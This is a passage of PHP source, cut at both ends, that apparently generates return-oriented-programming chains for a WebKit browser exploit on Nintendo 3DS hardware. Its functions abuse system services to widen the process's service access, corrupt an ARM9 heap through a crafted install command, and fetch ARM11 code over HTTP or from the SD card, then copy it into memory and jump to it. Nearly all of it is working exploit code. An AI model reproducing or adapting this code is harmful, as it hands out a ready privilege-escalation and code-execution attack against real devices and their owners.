		$ROPCHAIN.= genu32_unicode(0x0);//r4
		$ROPCHAIN.= genu32_unicode(0x0);//r5
		$ROPCHAIN.= genu32_unicode(0x0);//r6

		ropgen_readu32($ROPHEAP+4, 0, 1);
	}
	else if($browserver>=3)
	{
		$ROPCHAIN.= genu32_unicode(0x0);//r4
		
		ropgen_readu32($ROPHEAP+4, 0, 1);
	}
}

function ropgen_writeu32_cmdbuf($indexword, $value)
{
	//global $ROPHEAP, $POPPC, $ROP_WRITEU32_TOTHREADSTORAGE;

	//ropgen_writeu32($ROPHEAP+4, 0x20 + $indexword, 0, 1);
	//ropgen_callfunc($ROPHEAP+4, $value, 0x0, 0x0, $POPPC, $ROP_WRITEU32_TOTHREADSTORAGE);

	ropgen_getptr_threadlocalstorage();
	ropgen_writeu32(0, $value, 0x20+$indexword, 0);
}

function ropgen_readu32_cmdbuf($indexword)//r0 = word loaded from cmdbuf
{
	//global $ROPHEAP, $POPPC, $ROP_READU32_FROMTHREADSTORAGE;

	//ropgen_writeu32($ROPHEAP+4, 0x20 + $indexword, 0, 1);
	//ropgen_callfunc($ROPHEAP+4, 0x0, 0x0, 0x0, $POPPC, $ROP_READU32_FROMTHREADSTORAGE);

	ropgen_getptr_threadlocalstorage();
	ropgen_readu32(0, 0x20+$indexword, 0);
}

function ropgen_write_procid_cmdbuf($indexword)//This writes the current processid to the specified cmdbuf indexword.
{
	global $ROPCHAIN, $ROPHEAP, $POPPC, $svcGetProcessId, $POPLRPC, $ROP_POP_R1R5PC, $ROP_ADDR0_TO_R1;//, $ROP_POP_R0PC, $ROP_WRITEU32_TOTHREADSTORAGE;

	ropgen_getptr_threadlocalstorage();//r0 = localstorage ptr
	
	$ROPCHAIN.= genu32_unicode($POPLRPC);
	$ROPCHAIN.= genu32_unicode($POPPC);//lr
	$ROPCHAIN.= genu32_unicode($ROP_POP_R1R5PC);

	$ROPCHAIN.= genu32_unicode((0x20+$indexword) * 4);//r1
	$ROPCHAIN.= genu32_unicode(0x0);//r2
	$ROPCHAIN.= genu32_unicode(0x0);//r3
	$ROPCHAIN.= genu32_unicode(0x0);//r4
	$ROPCHAIN.= genu32_unicode(0x0);//r5
	$ROPCHAIN.= genu32_unicode($ROP_ADDR0_TO_R1);

	$ROPCHAIN.= genu32_unicode($ROP_POP_R1R5PC);

	$ROPCHAIN.= genu32_unicode(0xffff8001);//r1
	$ROPCHAIN.= genu32_unicode(0x0);//r2
	$ROPCHAIN.= genu32_unicode(0x0);//r3
	$ROPCHAIN.= genu32_unicode(0x0);//r4
	$ROPCHAIN.= genu32_unicode(0x0);//r5
	$ROPCHAIN.= genu32_unicode($svcGetProcessId);

	/*ropgen_writeu32($ROPHEAP+4, 0x20 + $indexword, 0, 1);
	ropgen_callfunc($ROPHEAP, 0xffff8001, 0x0, 0x0, $POPPC, $svcGetProcessId);

	$ROPCHAIN.= genu32_unicode($ROP_POP_R0PC);
	$ROPCHAIN.= genu32_unicode($ROPHEAP+4);//r0

	$ROPCHAIN.= genu32_unicode($POPLRPC);
	$ROPCHAIN.= genu32_unicode($POPPC);
	$ROPCHAIN.= genu32_unicode($ROP_WRITEU32_TOTHREADSTORAGE);*/
}

function ropgen_writeregdata($addr, $data, $pos)
{
	global $ROPCHAIN, $POPLRPC, $POPPC, $ROP_POP_R0IPPC, $ROP_STMR0_R0PC;

	$ROPCHAIN.= genu32_unicode($POPLRPC);

	$ROPCHAIN.= genu32_unicode($POPPC);//lr
	$ROPCHAIN.= genu32_unicode($ROP_POP_R0IPPC);

	$ROPCHAIN.= genu32_unicode($addr);
	$ROPCHAIN.= genu32_unicode($data[$pos+0]);//0x30-bytes total from $data
	$ROPCHAIN.= genu32_unicode($data[$pos+1]);
	$ROPCHAIN.= genu32_unicode($data[$pos+2]);
	$ROPCHAIN.= genu32_unicode($data[$pos+3]);
	$ROPCHAIN.= genu32_unicode($data[$pos+4]);
	$ROPCHAIN.= genu32_unicode($data[$pos+5]);
	$ROPCHAIN.= genu32_unicode($data[$pos+6]);
	$ROPCHAIN.= genu32_unicode($data[$pos+7]);
	$ROPCHAIN.= genu32_unicode($data[$pos+8]);
	$ROPCHAIN.= genu32_unicode($data[$pos+9]);
	$ROPCHAIN.= genu32_unicode($data[$pos+10]);
	$ROPCHAIN.= genu32_unicode($data[$pos+11]);

	$ROPCHAIN.= genu32_unicode($ROP_STMR0_R0PC);//"stm r0, {r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, sl, fp, ip, sp, lr, pc}"
}

function ropgen_writeregdata_wrap($addr, $data, $pos, $size)//write the u32s from array $data starting at index $pos, to $addr with byte-size $size.
{
	global $ROPHEAP, $ROP_MEMCPY, $POPPC;

	$total_entries = $size / 4;
	$curpos = 0;

	while($total_entries - $curpos >= 12)
	{
		ropgen_writeregdata($ROPHEAP+0x10, $data, $pos + $curpos);

		ropgen_callfunc($addr, $ROPHEAP+0x14, 0x30, 0x0, $POPPC, $ROP_MEMCPY);

		$curpos+= 12;
		$addr+= 0x30;
	}

	if($total_entries - $curpos == 0)return;

	$tmpdata = array();
	$i = 0;
	while($total_entries - $curpos > 0)
	{
		$tmpdata[$i] = $data[$pos + $curpos];
		$i++;
		$curpos++;
	}

	while($i<12)
	{
		$tmpdata[$i] = 0x0;
		$i++;
	}

	ropgen_writeregdata($ROPHEAP+0x10, $tmpdata, 0);
	ropgen_callfunc($addr, $ROPHEAP+0x14, 0x30, 0x0, $POPPC, $ROP_MEMCPY);
}

function ropgen_ldm_r0r3($ldm_addr, $stm_addr)
{
	global $ROPCHAIN, $ROP_POP_R0R6PC, $ROP_LDMSTM_R5R4_R0R3;

	if($stm_addr==0)$stm_addr = $ldm_addr;

	$ROPCHAIN.= genu32_unicode($ROP_POP_R0R6PC);
	$ROPCHAIN.= genu32_unicode(0x1);//r0
	$ROPCHAIN.= genu32_unicode(0x0);//r1
	$ROPCHAIN.= genu32_unicode(0x0);//r2
	$ROPCHAIN.= genu32_unicode(0x0);//r3
	$ROPCHAIN.= genu32_unicode($stm_addr);//r4
	$ROPCHAIN.= genu32_unicode($ldm_addr);//r5
	$ROPCHAIN.= genu32_unicode(0x0);//r6

	$ROPCHAIN.= genu32_unicode($ROP_LDMSTM_R5R4_R0R3);//"cmp r0, #0" "ldmne r5, {r0, r1, r2, r3}" "stmne r4, {r0, r1, r2, r3}" "popne {r4, r5, r6, pc}"

	$ROPCHAIN.= genu32_unicode(0x0);//r4
	$ROPCHAIN.= genu32_unicode(0x0);//r5
	$ROPCHAIN.= genu32_unicode(0x0);//r6
}

function ropgen_sendcmd($handleadr, $check_cmdret)
{
	global $ROPCHAIN, $POPPC, $POPPC, $POPLRPC, $svcSendSyncRequest;

	ropgen_readu32($handleadr, 0, 1);

	$ROPCHAIN.= genu32_unicode($POPLRPC);
	$ROPCHAIN.= genu32_unicode($POPPC);//lr

	$ROPCHAIN.= genu32_unicode($svcSendSyncRequest);
	ropgen_condfatalerr();

	if($check_cmdret)
	{
		ropgen_readu32_cmdbuf(1);
		ropgen_condfatalerr();
	}
}

function ropgen_curl_easy_init($curlstate)
{
	global $ROPCHAIN, $ROP_curl_easy_init, $POPLRPC, $POPPC, $ROP_POP_R1R5PC, $ROP_STR_R0TOR1;

	$ROPCHAIN.= genu32_unicode($POPLRPC);

	$ROPCHAIN.= genu32_unicode($POPPC);//lr
	$ROPCHAIN.= genu32_unicode($ROP_curl_easy_init);

	$ROPCHAIN.= genu32_unicode($POPLRPC);

	$ROPCHAIN.= genu32_unicode($POPPC);//lr
	$ROPCHAIN.= genu32_unicode($ROP_POP_R1R5PC);

	$ROPCHAIN.= genu32_unicode($curlstate);//r1
	$ROPCHAIN.= genu32_unicode(0x0);//r2
	$ROPCHAIN.= genu32_unicode(0x0);//r3
	$ROPCHAIN.= genu32_unicode(0x0);//r4
	$ROPCHAIN.= genu32_unicode(0x0);//r5
	$ROPCHAIN.= genu32_unicode($ROP_STR_R0TOR1);//Write the output CURL* ptr from curl_easy_init() to $curlstate.
}

function ropgen_curl_easy_cleanup($curlstate)
{
	global $ROPCHAIN, $POPLRPC, $POPPC, $ROP_curl_easy_cleanup;

	ropgen_ldm_r0r3($curlstate, 0);

	$ROPCHAIN.= genu32_unicode($POPLRPC);

	$ROPCHAIN.= genu32_unicode($POPPC);//lr
	$ROPCHAIN.= genu32_unicode($ROP_curl_easy_cleanup);
}

function ropgen_curl_easy_perform($curlstate)
{
	global $ROPCHAIN, $POPLRPC, $POPPC, $ROP_curl_easy_perform;

	ropgen_ldm_r0r3($curlstate, 0);

	$ROPCHAIN.= genu32_unicode($POPLRPC);

	$ROPCHAIN.= genu32_unicode($POPPC);//lr
	$ROPCHAIN.= genu32_unicode($ROP_curl_easy_perform);
}

function ropgen_curl_easy_setopt($curlstate, $type, $value, $set_params)
{
	global $ROPCHAIN, $POPLRPC, $POPPC, $ROP_curl_easy_setopt;

	if($set_params!=0)
	{
		ropgen_writeu32($curlstate+4, $type, 0, 1);
		ropgen_writeu32($curlstate+8, $value, 0, 1);
	}

	ropgen_ldm_r0r3($curlstate, 0);

	$ROPCHAIN.= genu32_unicode($POPLRPC);

	$ROPCHAIN.= genu32_unicode($POPPC);//lr
	$ROPCHAIN.= genu32_unicode($ROP_curl_easy_setopt);
}

function ropgen_httpdownload($bufaddr, $bufsize, $filepath, $url, $delete_tmpfile)
{
	global $ROPCHAIN, $ROPHEAP, $POPPC, $POPLRPC, $ROP_POP_R1R5PC, $WKC_FOPEN, $WKC_FCLOSE, $WKC_FREAD, $WKC_FWRITE, $WKC_FSEEK, $FS_DELETEFILE, $ROP_STR_R0TOR1, $ROP_MEMSETOTHER;

	$FD_ADDR = $ROPHEAP+0x140;
	$curlstate = $FD_ADDR+0x10;
	$filepathptr_utf16 = $curlstate+0x1000;

	if($filepath=="")$filepath = "sdmc:/webkithax_tmp.bin";
	$databuf_fn = string_gendata_array("/" . $filepath, 0, 0x40);//Filepath for wkc_fopen has to begin with either "/rom:/" or "/sdmc:/".
	$databuf_fn_utf16 = string_gendata_array($filepath, 1, 0x40*2);
	$databuf_mode = string_gendata_array("w+", 0, 0x4);
	$databuf_url = string_gendata_array($url, 0, 0x60);

	ropgen_writeregdata_wrap($ROPHEAP+0x80, $databuf_fn, 0, 0x40);
	ropgen_writeregdata_wrap($ROPHEAP+0xc0, $databuf_mode, 0, 0x4);
	ropgen_writeregdata_wrap($ROPHEAP+0xc4, $databuf_url, 0, 0x60);
	ropgen_writeregdata_wrap($filepathptr_utf16, $databuf_fn_utf16, 0, 0x40*2);

	ropgen_callfunc($filepathptr_utf16, 0x0, 0x0, 0x0, $POPPC, $FS_DELETEFILE);

	ropgen_callfunc($ROPHEAP+0x80, $ROPHEAP+0xc0, 0x0, 0x0, $POPPC, $WKC_FOPEN);//Open the file @ $filepath with mode "w+", via wkc_fopen().

	$ROPCHAIN.= genu32_unicode($POPLRPC);

	$ROPCHAIN.= genu32_unicode($POPPC);//lr
	$ROPCHAIN.= genu32_unicode($ROP_POP_R1R5PC);

	$ROPCHAIN.= genu32_unicode($FD_ADDR);//r1
	$ROPCHAIN.= genu32_unicode(0x0);//r2
	$ROPCHAIN.= genu32_unicode(0x0);//r3
	$ROPCHAIN.= genu32_unicode(0x0);//r4
	$ROPCHAIN.= genu32_unicode(0x0);//r5
	$ROPCHAIN.= genu32_unicode($ROP_STR_R0TOR1);//Write the out fd from wkc_fopen() to $FD_ADDR.

	ropgen_ldm_r0r3($FD_ADDR, $curlstate+8);//Copy the fd from $FD_ADDR to $curlstate+8(0x10-bytes are copied with this).
	ropgen_writeu32($curlstate+4, 10000 + 1, 0, 1);//type

	//$ROPCHAIN.= genu32_unicode(0x50505050);

	ropgen_curl_easy_init($curlstate);
	ropgen_curl_easy_setopt($curlstate, 10000 + 1, 0, 0);//Set the CURL FILE OPT("CURLOPT_WRITEDATA") to the fd which was copied to $curlstate+8.
	ropgen_curl_easy_setopt($curlstate, 20000 + 11, $WKC_FWRITE, 1);//WRITEFUNCTION
	ropgen_curl_easy_setopt($curlstate, 10000 + 2, $ROPHEAP+0xc4, 1);//curl_easy_setopt(<curl* ptr>, CURLOPT_URL, <urlptr>)
	ropgen_curl_easy_perform($curlstate);
	ropgen_curl_easy_cleanup($curlstate);

	if($bufaddr!=0 && $bufsize!=0)
	{
		ropgen_writeu32($FD_ADDR+4, 0x0, 0, 1);
		ropgen_writeu32($FD_ADDR+8, 0x0, 0, 1);

		ropgen_ldm_r0r3($FD_ADDR, 0);

		$ROPCHAIN.= genu32_unicode($POPPC);//lr
		$ROPCHAIN.= genu32_unicode($WKC_FSEEK);//wkc_fseek(fd, 0, SEEK_SET)

		ropgen_writeu32($FD_ADDR-12, $bufaddr, 0, 1);//ptr
		ropgen_writeu32($FD_ADDR-8, 0x1, 0, 1);//size
		ropgen_writeu32($FD_ADDR-4, $bufsize, 0, 1);//nmemb

		ropgen_ldm_r0r3($FD_ADDR-12, 0);

		$ROPCHAIN.= genu32_unicode($POPPC);//lr
		$ROPCHAIN.= genu32_unicode($WKC_FREAD);//wkc_fread($bufaddr, 1, $bufsize, fd)
	}

	if($delete_tmpfile)
	{
		ropgen_callfunc($ROPHEAP+0x200, 0x8000, 0x0, 0x0, $POPPC, $ROP_MEMSETOTHER);

		ropgen_writeu32($FD_ADDR+4, 0x0, 0, 1);
		ropgen_writeu32($FD_ADDR+8, 0x0, 0, 1);

		ropgen_ldm_r0r3($FD_ADDR, 0);

		$ROPCHAIN.= genu32_unicode($POPPC);//lr
		$ROPCHAIN.= genu32_unicode($WKC_FSEEK);//wkc_fseek(fd, 0, SEEK_SET)

		$chunksize = 0x8000;

		for($pos=0; $pos<$bufsize; $pos+=0x8000)
		{
			if($bufsize - $pos < $chunksize)$chunksize = $bufsize - $pos;

			ropgen_writeu32($FD_ADDR-12, $ROPHEAP+0x200, 0, 1);//ptr
			ropgen_writeu32($FD_ADDR-8, 0x1, 0, 1);//size
			ropgen_writeu32($FD_ADDR-4, $chunksize, 0, 1);//nmemb

			ropgen_ldm_r0r3($FD_ADDR-12, 0);

			$ROPCHAIN.= genu32_unicode($POPPC);//lr
			$ROPCHAIN.= genu32_unicode($WKC_FWRITE);//wkc_fwrite($bufaddr, 1, $bufsize, fd)
		}
	}

	ropgen_ldm_r0r3($FD_ADDR, 0);

	$ROPCHAIN.= genu32_unicode($POPLRPC);

	$ROPCHAIN.= genu32_unicode($POPPC);//lr
	$ROPCHAIN.= genu32_unicode($WKC_FCLOSE);

	if($delete_tmpfile)ropgen_callfunc($filepathptr_utf16, 0x0, 0x0, 0x0, $POPPC, $FS_DELETEFILE);
}

function ropgen_httpdownload_binary($bufaddr, $bufsize, $binid)
{
	global $ropchainparam, $DEVUNIT;

	$url = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['SCRIPT_NAME'];
	$url .= "?getbin=$binid";

	ropgen_httpdownload($bufaddr, $bufsize, "", $url, 1);
}

function getcodebin_array($path, $size)
{
	$code_arr = array();

	$codebin = file_get_contents($path);
	if($codebin===FALSE)
	{
		exit("Failed to open the code binary.");
	}

	for($i=0; $i<$size/4; $i++)$code_arr[$i] = 0x00000000;

	$tmpdata = unpack("V*", $codebin);

	$i = 0;
	while($i < count($tmpdata) && $i < $size/4)
	{
		$code_arr[$i] = $tmpdata[$i+1];
		//echo "$i: " . sprintf("%08x", $arm9code[$i]) . "\n";
		$i++;
	}

	return $code_arr;
}

function string_gendata_array($inputstr, $utf16_out, $size)
{
	$out_arr = array();

	for($i=0; $i<$size/4; $i++)$out_arr[$i] = 0x00000000;

	$i = 0;
	$pos = 0;
	while($i < strlen($inputstr) && $pos*4 < $size)
	{
		//echo "$i: " . sprintf("%08x", ord($inputstr[$i])) . "\n";
		if($utf16_out==0)
		{
			$out_arr[$pos] = ord($inputstr[$i]);
			if($i+1 < strlen($inputstr))$out_arr[$pos] |= (ord($inputstr[$i+1])<<8);
			if($i+2 < strlen($inputstr))$out_arr[$pos] |= (ord($inputstr[$i+2])<<16);
			if($i+3 < strlen($inputstr))$out_arr[$pos] |= (ord($inputstr[$i+3])<<24);
			$i+=4;
		}
		else
		{
			$out_arr[$pos] = ord($inputstr[$i]);
			if($i+1 < strlen($inputstr))$out_arr[$pos] |= (ord($inputstr[$i+1])<<16);
			$i+=2;
		}
		//echo "out $pos: " . sprintf("%08x", $out_arr[$pos]) . "\n";
		$pos++;
	}

	return $out_arr;
}

function generateropchain_type1()
{
	global $ROPHEAP, $ROPCHAIN, $ROP_INFINITELP, $POPPC, $POPLRPC, $ROP_POP_R0R6PC, $ROP_POP_R0R8PC, $ROP_STR_R1TOR0, $ROP_POP_R0PC, $SRVPORT_HANDLEADR, $srv_shutdown, $svcGetProcessId, $srv_GetServiceHandle, $srvpm_initialize, $SRV_REFCNT, $ROP_MEMSETOTHER, $DIFF_FILEREAD_FUNCPTR, $ARM9_HEAPHAXBUF;

	//$ROPCHAIN.= genu32_unicode(0x40404040);
	//$ROPCHAIN.= genu32_unicode(0x80808080);

	ropgen_writeu32($SRV_REFCNT, 1, 0, 1);//Set the srv reference counter to value 1, so that the below function calls do the actual srv shutdown and "srv:pm" initialization.

	ropgen_callfunc(0, 0, 0, 0, $POPPC, $srv_shutdown);
	ropgen_condfatalerr();

	ropgen_callfunc(0, 0, 0, 0, $POPPC, $srvpm_initialize);
	ropgen_condfatalerr();

	ropgen_writeu32_cmdbuf(0, 0x04040040);//Write the cmdhdr.
	ropgen_write_procid_cmdbuf(1);//Write the current processid to cmdbuf+4.

	ropgen_sendcmd($SRVPORT_HANDLEADR, 1);//Unregister the current process with srvpm.

	$databuf = array();

	$databuf[0x0*2 + 0] = 0x3a545041;//"APT:U"
	$databuf[0x0*2 + 1] = 0x00000055;
	$databuf[0x1*2 + 0] = 0x3a723279;//"y2r:u"
	$databuf[0x1*2 + 1] = 0x00000075;
	$databuf[0x2*2 + 0] = 0x3a707367;//"gsp::Gpu"
	$databuf[0x2*2 + 1] = 0x7570473a;
	$databuf[0x3*2 + 0] = 0x3a6d646e;//"ndm:u"
	$databuf[0x3*2 + 1] = 0x00000075;
	$databuf[0x4*2 + 0] = 0x553a7366;//"fs:USER"
	$databuf[0x4*2 + 1] = 0x00524553;
	$databuf[0x5*2 + 0] = 0x3a646968;//"hid:USER"
	$databuf[0x5*2 + 1] = 0x52455355;
	$databuf[0x6*2 + 0] = 0x3a707364;//"dsp::DSP"
	$databuf[0x6*2 + 1] = 0x5053443a;
	$databuf[0x7*2 + 0] = 0x3a676663;//"cfg:u"
	$databuf[0x7*2 + 1] = 0x00000075;
	$databuf[0x8*2 + 0] = 0x703a7370;//"ps:ps"
	$databuf[0x8*2 + 1] = 0x00000073;
	$databuf[0x9*2 + 0] = 0x6e3a6d61;//"am:net"
	$databuf[0x9*2 + 1] = 0x00007465;
	$databuf[0xa*2 + 0] = 0x00000000;
	$databuf[0xa*2 + 1] = 0x00000000;
	$databuf[0xb*2 + 0] = 0x00000000;
	$databuf[0xb*2 + 1] = 0x00000000;

	ropgen_writeregdata_wrap($ROPHEAP+0x100, $databuf, 0, 0x60);

	ropgen_writeu32_cmdbuf(0, 0x04030082);
	ropgen_write_procid_cmdbuf(1);//Write the current processid to cmdbuf+4.
	ropgen_writeu32_cmdbuf(2, 0x18);
	ropgen_writeu32_cmdbuf(3, 0x180002);
	ropgen_writeu32_cmdbuf(4, $ROPHEAP+0x100);

	ropgen_sendcmd($SRVPORT_HANDLEADR, 1);//Re-register the current process with srvpm with a new service-access-control list.

	ropgen_callfunc($ROPHEAP+0xc, $ROPHEAP + 0x100 + 0x9*8, 6, 0, $POPPC, $srv_GetServiceHandle);//Get the service handle for "am:net", out handle is @ $ROPHEAP+0xc.
	ropgen_condfatalerr();

	$HEAPHAXBUF = $ROPHEAP+0x100;
	ropgen_callfunc($HEAPHAXBUF, 0x2800, 0xffffffff, 0x0, $POPPC, $ROP_MEMSETOTHER);//Clear the 0x2800-byte buffer with value 0xffffffff, this buffer is passed to the below command.

	ropgen_callfunc($HEAPHAXBUF, 0x280, 0x0, 0x0, $POPPC, $ROP_MEMSETOTHER);//RSA-2048 "cert" used to trigger an error so that the below command aborts processing the entire input cert buffer data.
	ropgen_writeu32($HEAPHAXBUF, 0x3000100, 0, 1);//Big-endian signature-type 0x10003, for RSA-4096 SHA256.

	ropgen_writeregdata_wrap($HEAPHAXBUF+4, getcodebin_array("3ds_arm9codeldr.bin", 0x1c0), 0, 0x1c0);

	$databuf = array();
	$databuf[0] = 0x4652;//"RF"
	$databuf[1] = 0x150;//Available free space following this chunk header.
	$databuf[2] = $DIFF_FILEREAD_FUNCPTR-12;//prev memchunk ptr
	$databuf[3] = $ARM9_HEAPHAXBUF+4;//next memchunk ptr, arm9 code addr.

	ropgen_writeregdata_wrap($HEAPHAXBUF+4+0x200+0x88, $databuf, 0, 0x10);

	$databuf = array();
	$databuf[0] = 0x08093920;//Heap memctx
	$databuf[1] = 0;
	$databuf[2] = 0;
	$databuf[3] = 0;
	$databuf[4] = 0;
	$databuf[5] = 0;
	$databuf[6] = 0x45585048;
	$databuf[7] = 0;
	$databuf[8] = 0;
	$databuf[9] = 0;
	$databuf[10] = 0;
	$databuf[11] = 0x00040000;
	$databuf[12] = 0x080A2EE4;
	$databuf[13] = 0x080B5280;
	$databuf[14] = 0;
	$databuf[15] = $ARM9_HEAPHAXBUF+4+0x200+0x88;//These two are RF chunk ptrs
	$databuf[16] = $ARM9_HEAPHAXBUF+4+0x200+0x88;
	ropgen_writeregdata_wrap($HEAPHAXBUF+0x2800, $databuf, 0, 0x3c+8);

	ropgen_writeu32_cmdbuf(0, 0x08190108);
	ropgen_writeu32_cmdbuf(1, 0xa00);
	ropgen_writeu32_cmdbuf(2, 0xa00);
	ropgen_writeu32_cmdbuf(3, 0xa00);
	ropgen_writeu32_cmdbuf(4, 0xa00 + 0x3c + 8);
	ropgen_writeu32_cmdbuf(5, (0xa00<<4) | 10);
	ropgen_writeu32_cmdbuf(6, $HEAPHAXBUF);
	ropgen_writeu32_cmdbuf(7, (0xa00<<4) | 10);
	ropgen_writeu32_cmdbuf(8, $HEAPHAXBUF + (0xa00*1));
	ropgen_writeu32_cmdbuf(9, (0xa00<<4) | 10);
	ropgen_writeu32_cmdbuf(10, $HEAPHAXBUF + (0xa00*2));
	ropgen_writeu32_cmdbuf(11, ((0xa00 + 0x3c + 8)<<4) | 10);
	ropgen_writeu32_cmdbuf(12, $HEAPHAXBUF + (0xa00*3));

	ropgen_sendcmd($ROPHEAP+0xc, 0);//.ctx install cmd?

	ropgen_writeu32_cmdbuf(0, 0x00190040);
	ropgen_writeu32_cmdbuf(1, 1);//mediatype = SD

	ropgen_sendcmd($ROPHEAP+0xc, 0);//ReloadDBS, for SD card.

	$ROPCHAIN.= genu32_unicode(0x50505050);//genu32_unicode($ROP_INFINITELP);
}

function generateropchain_type2()
{
	global $ROPHEAP, $ROPCHAIN, $POPLRPC, $POPPC, $ROP_POP_R0R6PC, $ROP_POP_R1R5PC, $OSSCRO_HEAPADR, $OSSCRO_MAPADR, $APPHEAP_PHYSADDR, $svcControlMemory, $ROP_MEMSETOTHER, $IFile_Open, $IFile_Read, $IFile_Write, $IFile_Close, $IFile_GetSize, $IFile_Seek, $GSP_FLUSHDCACHE, $GXLOW_CMD4, $svcSleepThread, $THROW_FATALERR, $SRVPORT_HANDLEADR, $SRV_REFCNT, $srvpm_initialize, $srv_shutdown, $srv_GetServiceHandle, $GSP_WRITEHWREGS, $GSPGPU_SERVHANDLEADR, /*$APT_PrepareToDoApplicationJump,*/ $APT_DoApplicationJump, $arm11code_loadfromsd;

	$LINEAR_TMPBUF = 0x18B40000;
	$LINEAR_CODETMPBUF = $LINEAR_TMPBUF + 0x1000;
	$OSSCRO_PHYSADDR = ($OSSCRO_HEAPADR - 0x08000000) + $APPHEAP_PHYSADDR;
	$LINEARADR_OSSCRO = ($OSSCRO_PHYSADDR - 0x20000000) + 0x14000000;
	$LINEARADR_CODESTART = $LINEARADR_OSSCRO + 0x6e0;
	$CODESTART_MAPADR = $OSSCRO_MAPADR + 0x6e0;

	$IFile_ctx = $ROPHEAP;

	ropgen_writeu32($ROPHEAP, 0x0100FFFF, 0, 1);
	ropgen_callfunc(0x1ED02A04-0x1EB00000, $ROPHEAP, 0x4, 0x0, $POPPC, $GSP_WRITEHWREGS);//Set the sub-screen colorfill reg so that yellow is displayed.

	ropgen_callfunc($LINEAR_TMPBUF, 0x11000, 0x0, 0x0, $POPPC, $ROP_MEMSETOTHER);

	if($arm11code_loadfromsd==0)
	{
		$data_arr = getcodebin_array(browserhaxcfg_getbinpath_ropchain2(), 0x540);
	
		ropgen_writeregdata_wrap($LINEAR_CODETMPBUF, $data_arr, 0, 0x540);
	}
	else if($arm11code_loadfromsd==1)
	{
		ropgen_callfunc($IFile_ctx, 0x14, 0x0, 0x0, $POPPC, $ROP_MEMSETOTHER);//Clear the IFile ctx.

		/*$databuf = array();
		$databuf[0] = 0x640073;
		$databuf[1] = 0x63006d;
		$databuf[2] = 0x2f003a;
		$databuf[3] = 0x720061;
		$databuf[4] = 0x31006d;
		$databuf[5] = 0x630031;
		$databuf[6] = 0x64006f;
		$databuf[7] = 0x2e0065;
		$databuf[8] = 0x690062;
		$databuf[9] = 0x6e;*/

		$databuf = string_gendata_array("sdmc:/arm11code.bin", 1, 0x40);

		ropgen_writeregdata_wrap($ROPHEAP+0x40, $databuf, 0, 0x28);//Write the following utf16 string to ROPHEAP+0x40: "sdmc:/arm11code.bin".

		ropgen_callfunc($IFile_ctx, $ROPHEAP+0x40, 0x1, 0x0, $POPPC, $IFile_Open);//Open the above file.
		//$ROPCHAIN.= genu32_unicode(0x50505050);
		ropgen_condfatalerr();

		ropgen_callfunc($IFile_ctx, $ROPHEAP+0x20, $LINEAR_CODETMPBUF, 0x10000, $POPPC, $IFile_Read);//Read the file to $LINEAR_CODETMPBUF with size 0x10000, actual size must be <=0x10000.
		//$ROPCHAIN.= genu32_unicode(0x40404040);
		ropgen_condfatalerr();

		ropgen_readu32($IFile_ctx, 0, 1);

		$ROPCHAIN.= genu32_unicode($POPLRPC);
		$ROPCHAIN.= genu32_unicode($POPPC);//lr
		$ROPCHAIN.= genu32_unicode($ROP_POP_R1R5PC);

		$ROPCHAIN.= genu32_unicode(0x0);//r1
		$ROPCHAIN.= genu32_unicode(0x0);//r2
		$ROPCHAIN.= genu32_unicode(0x0);//r3
		$ROPCHAIN.= genu32_unicode(0x0);//r4
		$ROPCHAIN.= genu32_unicode(0x0);//r5
		$ROPCHAIN.= genu32_unicode($IFile_Close);
	}
	else if($arm11code_loadfromsd==2)
	{
		ropgen_httpdownload_binary($LINEAR_CODETMPBUF, 0x10000, browserhaxcfg_getbinparam_type3());
	}

	ropgen_callfunc($LINEAR_CODETMPBUF, 0x10000, 0x0, 0x0, $POPPC, $GSP_FLUSHDCACHE);//Flush the data-cache for the loaded code.

	$databuf = array();
	$databuf[0] = 0x0;
	$databuf[1] = $THROW_FATALERR;
	$databuf[2] = $SRVPORT_HANDLEADR;
	$databuf[3] = $SRV_REFCNT;
	$databuf[4] = $srvpm_initialize;
	$databuf[5] = $srv_shutdown;
	$databuf[6] = $srv_GetServiceHandle;
	$databuf[7] = $GXLOW_CMD4;
	$databuf[8] = $GSP_FLUSHDCACHE;
	$databuf[9] = $IFile_Open;
	$databuf[10] = $IFile_Close;
	$databuf[11] = $IFile_GetSize;
	$databuf[12] = $IFile_Seek;
	$databuf[13] = $IFile_Read;
	$databuf[14] = $IFile_Write;
	$databuf[15] = $GSP_WRITEHWREGS;
	$databuf[16] = 0;//$APT_PrepareToDoApplicationJump;
	$databuf[17] = 0;//$APT_DoApplicationJump;
	$databuf[18] = 0x2;//flags
	$databuf[19] = 0x0;
	$databuf[20] = 0x0;
	$databuf[21] = 0x0;
	$databuf[22] = $GSPGPU_SERVHANDLEADR;//GSPGPU handle*
	$databuf[23] = 0x114;//NS appID
	ropgen_writeregdata_wrap($LINEAR_TMPBUF, $databuf, 0, 24*4);

	$ROPCHAIN.= genu32_unicode($POPLRPC);
	$ROPCHAIN.= genu32_unicode($ROP_POP_R0R6PC);

	$ROPCHAIN.= genu32_unicode($ROP_POP_R0R6PC);
	$ROPCHAIN.= genu32_unicode($LINEAR_CODETMPBUF);//r0 srcaddr
	$ROPCHAIN.= genu32_unicode($LINEARADR_CODESTART);//r1 dstaddr
	$ROPCHAIN.= genu32_unicode(0x10000);//r2 size
	$ROPCHAIN.= genu32_unicode(0x0);//r3 width0
	$ROPCHAIN.= genu32_unicode(0x0);//r4
	$ROPCHAIN.= genu32_unicode(0x0);//r5
	$ROPCHAIN.= genu32_unicode(0x0);//r6

	$ROPCHAIN.= genu32_unicode($GXLOW_CMD4);//Copy the loaded code to the start of the CRO.

	$ROPCHAIN.= genu32_unicode(0x0);//sp0 height0
	$ROPCHAIN.= genu32_unicode(0x0);//sp4 width1
	$ROPCHAIN.= genu32_unicode(0x0);//sp8 height1
	$ROPCHAIN.= genu32_unicode(0x8);//sp12 flags 
	$ROPCHAIN.= genu32_unicode(0x0);//r4
	$ROPCHAIN.= genu32_unicode(0x0);//r5
	$ROPCHAIN.= genu32_unicode(0x0);//r6

	$ROPCHAIN.= genu32_unicode($POPLRPC);//Delay 1 second while the above copy-command is being processed, then jump to that code.
	$ROPCHAIN.= genu32_unicode($POPPC);

	$ROPCHAIN.= genu32_unicode($ROP_POP_R0R6PC);
	$ROPCHAIN.= genu32_unicode(1000000000);//r0
	$ROPCHAIN.= genu32_unicode(0x0);//r1
	$ROPCHAIN.= genu32_unicode(0x0);//r2
	$ROPCHAIN.= genu32_unicode(0x0);//r3
	$ROPCHAIN.= genu32_unicode(0x0);//r4
